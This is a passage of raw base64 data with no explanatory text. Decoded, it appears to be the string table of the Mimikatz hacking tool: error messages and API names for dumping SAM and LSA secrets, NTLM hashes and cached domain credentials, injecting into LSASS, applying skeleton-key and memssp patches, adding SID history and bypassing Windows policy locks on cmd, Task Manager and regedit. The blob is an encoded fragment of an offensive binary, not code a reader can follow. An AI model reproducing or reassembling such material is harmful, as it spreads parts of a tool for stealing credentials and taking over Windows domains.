AawBlAHkAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBPAHAAZQBuAEsAZQB5AEUAeAAgAEwAUwBBACAASwBPAAoAAAAAAAAAAABTAEEATQBcAEQAbwBtAGEAaQBuAHMAXABBAGMAYwBvAHUAbgB0AAAAVQBzAGUAcgBzAAAAAAAAAE4AYQBtAGUAcwAAAAAAAAAKAFIASQBEACAAIAA6ACAAJQAwADgAeAAgACgAJQB1ACkACgAAAAAAVgAAAAAAAABVAHMAZQByACAAOgAgACUALgAqAHMACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AFUAcwBlAHIAcwBBAG4AZABTAGEAbQBLAGUAeQAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAFEAdQBlAHIAeQBWAGEAbAB1AGUARQB4ACAAVgAgAEsATwAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABVAHMAZQByAHMAQQBuAGQAUwBhAG0ASwBlAHkAIAA7ACAAcAByAGUAIAAtACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBRAHUAZQByAHkAVgBhAGwAdQBlAEUAeAAgAFYAIABLAE8ACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AFUAcwBlAHIAcwBBAG4AZABTAGEAbQBLAGUAeQAgADsAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABLAGUAIABLAE8ACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AFUAcwBlAHIAcwBBAG4AZABTAGEAbQBLAGUAeQAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAE8AcABlAG4ASwBlAHkARQB4ACAAUwBBAE0AIABBAGMAYwBvAHUAbgB0AHMAIAAoADAAeAAlADA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AXwBnAGUAdABOAEwASwBNAFMAZQBjAHIAZQB0AEEAbgBkAEMAYQBjAGgAZQAgADsAIABDAHIAeQBwAHQAUwBlAHQASwBlAHkAUABhAHIAYQBtACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABOAEwASwBNAFMAZQBjAHIAZQB0AEEAbgBkAEMAYQBjAGgAZQAgADsAIABDAHIAeQBwAHQASQBtAHAAbwByAHQASwBlAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABOAEwASwBNAFMAZQBjAHIAZQB0AEEAbgBkAEMAYQBjAGgAZQAgADsAIABSAHQAbABFAG4AYwByAHkAcAB0AEQAZQBjAHIAeQBwAHQAUgBDADQAIAA6ACAAMAB4ACUAMAA4AHgACgAAAFUAcwBlAHIAIAAgACAAIAAgACAAOgAgACUALgAqAHMAXAAlAC4AKgBzAAoAAAAAAE0AcwBDAGEAYwBoAGUAVgAlAGMAIAA6ACAAAAAAAAAATwBiAGoAZQBjAHQATgBhAG0AZQAAAAAAIAAvACAAcwBlAHIAdgBpAGMAZQAgACcAJQBzACcAIAB3AGkAdABoACAAdQBzAGUAcgBuAGEAbQBlACAAOgAgACUAcwAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBkAGUAYwByAHkAcAB0AFMAZQBjAHIAZQB0ACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcAUQB1AGUAcgB5AFYAYQBsAHUAZQBFAHgAIABTAGUAYwByAGUAdAAgAHYAYQBsAHUAZQAgAEsATwAKAAAAAAAAACQATQBBAEMASABJAE4ARQAuAEEAQwBDAAAAAAAAAAAATgBUAEwATQA6AAAALwAAAHQAZQB4AHQAOgAgACUAdwBaAAAAAAAAAGgAZQB4ACAAOgAgAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAZQBjAF8AYQBlAHMAMgA1ADYAIAA7ACAAQwByAHkAcAB0AEQAZQBjAHIAeQBwAHQAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBlAGMAXwBhAGUAcwAyADUANgAgADsAIABDAHIAeQBwAHQASQBtAHAAbwByAHQASwBlAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAU2FtSUNvbm5lY3QAAAAAAFNhbXJDbG9zZUhhbmRsZQBTYW1JUmV0cmlldmVQcmltYXJ5Q3JlZGVudGlhbHMAAFNhbXJPcGVuRG9tYWluAABTYW1yT3BlblVzZXIAAAAAU2FtclF1ZXJ5SW5mb3JtYXRpb25Vc2VyAAAAAAAAAABTYW1JRnJlZV9TQU1QUl9VU0VSX0lORk9fQlVGRkVSAExzYUlRdWVyeUluZm9ybWF0aW9uUG9saWN5VHJ1c3RlZAAAAAAAAABMc2FJRnJlZV9MU0FQUl9QT0xJQ1lfSU5GT1JNQVRJT04AAAAAAAAAVmlydHVhbEFsbG9jAAAAAExvY2FsRnJlZQAAAG1lbWNweQAAAAAAAHAAYQB0AGMAaAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBsAHMAYQAgADsAIABrAHUAbABsAF8AbQBfAHAAYQB0AGMAaAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AbABzAGEAIAA7ACAAawB1AGwAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AZwBlAHQAVgBlAHIAeQBCAGEAcwBpAGMATQBvAGQAdQBsAGUASQBuAGYAbwByAG0AYQB0AGkAbwBuAHMARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAGkAbgBqAGUAYwB0AAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGwAcwBhACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAG0AbwB0AGUAbABpAGIAXwBDAHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBDAG8AZABlAFcAaQB0AHQAaABQAGEAdAB0AGUAcgBuAFIAZQBwAGwAYQBjAGUACgAAAAAAAAAAAEQAbwBtAGEAaQBuACAAOgAgACUAdwBaACAALwAgAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBsAHMAYQAgADsAIABTAGEAbQBMAG8AbwBrAHUAcABJAGQAcwBJAG4ARABvAG0AYQBpAG4AIAAlADAAOAB4AAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AbABzAGEAIAA7ACAAJwAlAHMAJwAgAGkAcwAgAG4AbwB0ACAAYQAgAHYAYQBsAGkAZAAgAEkAZAAKAAAAAABuAGEAbQBlAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBsAHMAYQAgADsAIABTAGEAbQBMAG8AbwBrAHUAcABOAGEAbQBlAHMASQBuAEQAbwBtAGEAaQBuACAAJQAwADgAeAAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AbABzAGEAIAA7ACAAUwBhAG0ARQBuAHUAbQBlAHIAYQB0AGUAVQBzAGUAcgBzAEkAbgBEAG8AbQBhAGkAbgAgACUAMAA4AHgACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBsAHMAYQAgADsAIABTAGEAbQBPAHAAZQBuAEQAbwBtAGEAaQBuACAAJQAwADgAeAAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBsAHMAYQAgADsAIABTAGEAbQBDAG8AbgBuAGUAYwB0ACAAJQAwADgAeAAKAAAAUwBhAG0AUwBzAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AbABzAGEAXwBnAGUAdABIAGEAbgBkAGwAZQAgADsAIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBsAHMAYQBfAGcAZQB0AEgAYQBuAGQAbABlACAAOwAgAGsAdQBsAGwAXwBtAF8AcwBlAHIAdgBpAGMAZQBfAGcAZQB0AFUAbgBpAHEAdQBlAEYAbwByAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAACgBSAEkARAAgACAAOgAgACUAMAA4AHgAIAAoACUAdQApAAoAVQBzAGUAcgAgADoAIAAlAHcAWgAKAAAAAAAAAEwATQAgACAAIAA6ACAAAAAKAE4AVABMAE0AIAA6ACAAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGwAcwBhAF8AdQBzAGUAcgAgADsAIABTAGEAbQBRAHUAZQByAHkASQBuAGYAbwByAG0AYQB0AGkAbwBuAFUAcwBlAHIAIAAlADAAOAB4AAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AbABzAGEAXwB1AHMAZQByACAAOwAgAFMAYQBtAE8AcABlAG4AVQBzAGUAcgAgACUAMAA4AHgACgAAAAAAAAB1AG4AawBuAG8AdwBuAAAACgAgACoAIAAlAHMACgAAACAAIAAgACAATABNACAAIAAgADoAIAAAAAoAIAAgACAAIABOAFQATABNACAAOgAgAAAAAAAAAAAAIAAgACAAIAAlAC4AKgBzAAoAAAAAAAAAIAAgACAAIAAlADAAMgB1ACAAIAAAAAAAIAAgACAAIABEAGUAZgBhAHUAbAB0ACAAUwBhAGwAdAAgADoAIAAlAC4AKgBzAAoAAAAAAAAAAABDAHIAZQBkAGUAbgB0AGkAYQBsAHMAAABPAGwAZABDAHIAZQBkAGUAbgB0AGkAYQBsAHMAAAAAACAAIAAgACAARABlAGYAYQB1AGwAdAAgAFMAYQBsAHQAIAA6ACAAJQAuACoAcwAKACAAIAAgACAARABlAGYAYQB1AGwAdAAgAEkAdABlAHIAYQB0AGkAbwBuAHMAIAA6ACAAJQB1AAoAAAAAAAAAAABTAGUAcgB2AGkAYwBlAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAAAATwBsAGQAZQByAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAAAAAAAAACAAIAAgACAAJQBzAAoAAAAgACAAIAAgACAAIAAlAHMAIAA6ACAAAAAgACAAIAAgACAAIAAlAHMAIAAoACUAdQApACAAOgAgAAAAAAAAAAAAbQBzAHYAYwByAHQALgBkAGwAbAAAAAAAYQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbgBnAAAAAABkAGkAcwBjAG8AdgBlAHIAaQBuAGcAAABhAHMAcwBvAGMAaQBhAHQAaQBuAGcAAABkAGkAcwBjAG8AbgBuAGUAYwB0AGUAZAAAAAAAAAAAAGQAaQBzAGMAbwBuAG4AZQBjAHQAaQBuAGcAAAAAAAAAYQBkAF8AaABvAGMAXwBuAGUAdAB3AG8AcgBrAF8AZgBvAHIAbQBlAGQAAAAAAAAAYwBvAG4AbgBlAGMAdABlAGQAAAAAAAAAbgBvAHQAXwByAGUAYQBkAHkAAAAAAAAAcwBrAGUAbABlAHQAbwBuAAAAAAAAAAAAbQBlAG0AcwBzAHAAAAAAAGEAZABkAHMAaQBkAAAAAAB3AGkAZgBpAAAAAAAAAAAAWwBlAHgAcABlAHIAaQBtAGUAbgB0AGEAbABdACAAVAByAHkAIAB0AG8AIABlAG4AdQBtAGUAcgBhAHQAZQAgAGEAbABsACAAbQBvAGQAdQBsAGUAcwAgAHcAaQB0AGgAIABEAGUAdABvAHUAcgBzAC0AbABpAGsAZQAgAGgAbwBvAGsAcwAAAGQAZQB0AG8AdQByAHMAAAAAAAAAAAAAAEoAdQBuAGkAcABlAHIAIABOAGUAdAB3AG8AcgBrACAAQwBvAG4AbgBlAGMAdAAgACgAdwBpAHQAaABvAHUAdAAgAHIAbwB1AHQAZQAgAG0AbwBuAGkAdABvAHIAaQBuAGcAKQAAAAAAbgBjAHIAbwB1AHQAZQBtAG8AbgAAAAAAVABhAHMAawAgAE0AYQBuAGEAZwBlAHIAIAAgACAAIAAgACAAIAAgACAAIAAgACAAKAB3AGkAdABoAG8AdQB0ACAARABpAHMAYQBiAGwAZQBUAGEAcwBrAE0AZwByACkAAAAAAAAAAAB0AGEAcwBrAG0AZwByAAAAAAAAAAAAAABSAGUAZwBpAHMAdAByAHkAIABFAGQAaQB0AG8AcgAgACAAIAAgACAAIAAgACAAIAAoAHcAaQB0AGgAbwB1AHQAIABEAGkAcwBhAGIAbABlAFIAZQBnAGkAcwB0AHIAeQBUAG8AbwBsAHMAKQAAAAAAcgBlAGcAZQBkAGkAdAAAAEMAbwBtAG0AYQBuAGQAIABQAHIAbwBtAHAAdAAgACAAIAAgACAAIAAgACAAIAAgACgAdwBpAHQAaABvAHUAdAAgAEQAaQBzAGEAYgBsAGUAQwBNAEQAKQAAAAAAAAAAAGMAbQBkAAAATQBpAHMAYwBlAGwAbABhAG4AZQBvAHUAcwAgAG0AbwBkAHUAbABlAAAAAAAAAAAAbQBpAHMAYwAAAAAAAAAAAHcAbABhAG4AYQBwAGkAAABXbGFuT3BlbkhhbmRsZQAAV2xhbkNsb3NlSGFuZGxlAFdsYW5FbnVtSW50ZXJmYWNlcwAAAAAAAFdsYW5HZXRQcm9maWxlTGlzdAAAAAAAAFdsYW5HZXRQcm9maWxlAABXbGFuRnJlZU1lbW9yeQAASwBpAHcAaQBBAG4AZABDAE0ARAAAAAAARABpAHMAYQBiAGwAZQBDAE0ARAAAAAAAYwBtAGQALgBlAHgAZQAAAEsAaQB3AGkAQQBuAGQAUgBlAGcAaQBzAHQAcgB5AFQAbwBvAGwAcwAAAAAAAAAAAEQAaQBzAGEAYgBsAGUAUgBlAGcAaQBzAHQAcgB5AFQAbwBvAGwAcwAAAAAAAAAAAHIAZQBnAGUAZABpAHQALgBlAHgAZQAAAEsAaQB3AGkAQQBuAGQAVABhAHMAawBNAGcAcgAAAAAARABpAHMAYQBiAGwAZQBUAGEAcwBrAE0AZwByAAAAAAB0AGEAcwBrAG0AZwByAC4AZQB4AGUAAABkAHMATgBjAFMAZQByAHYAaQBjAGUAAAAJACgAJQB3AFoAKQAAAAAACQBbACUAdQBdACAAJQB3AFoAIAAhACAAAAAAAAAAAAAlAC0AMwAyAFMAAAAAAAAAIwAgACUAdQAAAAAAAAAAAAkAIAAlAHAAIAAtAD4AIAAlAHAAAAAAACUAdwBaACAAKAAlAHUAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAGQAZQB0AG8AdQByAHMAXwBjAGEAbABsAGIAYQBjAGsAXwBwAHIAbwBjAGUAcwBzACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAFAAYQB0AGMAaAAgAE8ASwAgAGYAbwByACAAJwAlAHMAJwAgAGYAcgBvAG0AIAAnACUAcwAnACAAdABvACAAJwAlAHMAJwAgAEAAIAAlAHAACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAGcAZQBuAGUAcgBpAGMAXwBuAG8AZwBwAG8AXwBwAGEAdABjAGgAIAA7ACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAIAAqACAAAAAgAC8AIAAlAHMAIAAtACAAJQBzAAoAAAAJAHwAIAAlAHMACgAAAAAAbgB0AGQAcwAAAAAAAAAAAG4AdABkAHMAYQBpAC4AZABsAGwAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAcwBjAF8AYQBkAGQAcwBpAGQAIAA7ACAAawB1AGwAbABfAG0AXwBtAGUAbQBvAHIAeQBfAGMAbwBwAHkAIAAoAGIAYQBjAGsAdQBwACkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAFMAZQBhAHIAYwBoACAAJQB1ACAAOgAgAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBhAGQAZABzAGkAZAAgADsAIABrAHUAbABsAF8AbQBfAG0AZQBtAG8AcgB5AF8AcwBlAGEAcgBjAGgAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAGEAZABkAHMAaQBkACAAOwAgAGsAdQBsAGwAXwBtAF8AbQBlAG0AbwByAHkAXwBjAG8AcAB5ACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBhAGQAZABzAGkAZAAgADsAIABrAHUAbABsAF8AbQBfAG0AZQBtAG8AcgB5AF8AcAByAG8AdABlAGMAdAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABTAEkARABIAGkAcwB0AG8AcgB5ACAAZgBvAHIAIAAnACUAcwAnAAoAAAAAAAAAAAAgACoAIAAlAHMACQAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBhAGQAZABzAGkAZAAgADsAIABEAHMAQQBkAGQAUwBpAGQASABpAHMAdABvAHIAeQA6ACAAMAB4ACUAMAA4AHgAIAAoACUAdQApACEACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAGEAZABkAHMAaQBkACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBhAGQAZABzAGkAZAAgADsAIABEAHMAQgBpAG4AZAA6ACAAJQAwADgAeAAgACgAJQB1ACkAIQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBhAGQAZABzAGkAZAAgADsAIABPAFMAIABuAG8AdAAgAHMAdQBwAHAAbwByAHQAZQBkACAAKABvAG4AbAB5ACAAdwAyAGsAOAByADIAIAAmACAAdwAyAGsAMQAyAHIAMgApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBhAGQAZABzAGkAZAAgADsAIABJAHQAIAByAGUAcQB1AGkAcgBlAHMAIABhAHQAIABsAGUAYQBzAHQAIAAyACAAYQByAGcAcwAKAAAAZm9wZW4AAABmd3ByaW50ZgAAAABmY2xvc2UAAAAAAABsAHMAYQBzAHMALgBlAHgAZQAAAAAAAABtAHMAdgAxAF8AMAAuAGQAbABsAAAAAABJAG4AagBlAGMAdABlAGQAIAA9ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAG0AZQBtAHMAcwBwACAAOwAgAGsAdQBsAGwAXwBtAF8AbQBlAG0AbwByAHkAXwBjAG8AcAB5ACAALQAgAFQAcgBhAG0AcABvAGwAaQBuAGUAIABuADAAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAG0AZQBtAHMAcwBwACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAG0AbwB0AGUAbABpAGIAXwBDAHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBDAG8AZABlAFcAaQB0AHQAaABQAGEAdAB0AGUAcgBuAFIAZQBwAGwAYQBjAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAG0AZQBtAHMAcwBwACAAOwAgAGsAdQBsAGwAXwBtAF8AbQBlAG0AbwByAHkAXwBjAG8AcAB5ACAALQAgAFQAcgBhAG0AcABvAGwAaQBuAGUAIABuADEAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAG0AZQBtAHMAcwBwACAAOwAgAGsAdQBsAGwAXwBtAF8AbQBlAG0AbwByAHkAXwBjAG8AcAB5ACAALQAgAHIAZQBhAGwAIABhAHMAbQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAG0AZQBtAHMAcwBwACAAOwAgAGsAdQBsAGwAXwBtAF8AbQBlAG0AbwByAHkAXwBzAGUAYQByAGMAaAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAcwBjAF8AbQBlAG0AcwBzAHAAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAG0AZQBtAHMAcwBwACAAOwAgAGsAdQBsAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQB0AFAAcgBvAGMAZQBzAHMASQBkAEYAbwByAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAExvY2FsQWxsb2MAAAAAAABrAGQAYwBzAHYAYwAuAGQAbABsAAAAAABbAEsARABDAF0AIABkAGEAdABhAAoAAABbAEsARABDAF0AIABzAHQAcgB1AGMAdAAKAAAAAAAAAFsASwBEAEMAXQAgAGsAZQB5AHMAIABwAGEAdABjAGgAIABPAEsACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAHMAawBlAGwAZQB0AG8AbgAgADsAIABTAGUAYwBvAG4AZAAgAHAAYQB0AHQAZQByAG4AIABuAG8AdAAgAGYAbwB1AG4AZAAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBzAGsAZQBsAGUAdABvAG4AIAA7ACAARgBpAHIAcwB0ACAAcABhAHQAdABlAHIAbgAgAG4AbwB0ACAAZgBvAHUAbgBkAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAcwBjAF8AcwBrAGUAbABlAHQAbwBuACAAOwAgAGsAdQBsAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQB0AFYAZQByAHkAQgBhAHMAaQBjAE0AbwBkAHUAbABlAEkAbgBmAG8AcgBtAGEAdABpAG8AbgBzAEYAbwByAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAGMAcgB5AHAAdABkAGwAbAAuAGQAbABsAAAAAAAAAAAAWwBSAEMANABdACAAZgB1AG4AYwB0AGkAbwBuAHMACgAAAAAAAAAAAFsAUgBDADQAXQAgAGkAbgBpAHQAIABwAGEAdABjAGgAIABPAEsACgAAAAAAAAAAAFsAUgBDADQAXQAgAGQAZQBjAHIAeQBwAHQAIABwAGEAdABjAGgAIABPAEsACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAHMAawBlAGwAZQB0AG8AbgAgADsAIABVAG4AYQBiAGwAZQAgAHQAbwAgAGMAcgBlAGEAdABlACAAcgBlAG0AbwB0AGUAIABmAHUAbgBjAHQAaQBvAG4AcwAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAcwBjAF8AcwBrAGUAbABlAHQAbwBuACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABnAHIAbwB1AHAAAAAAAAAAbABvAGMAYQBsAGcAcgBvAHUAcAAAAAAAbgBlAHQAAAAA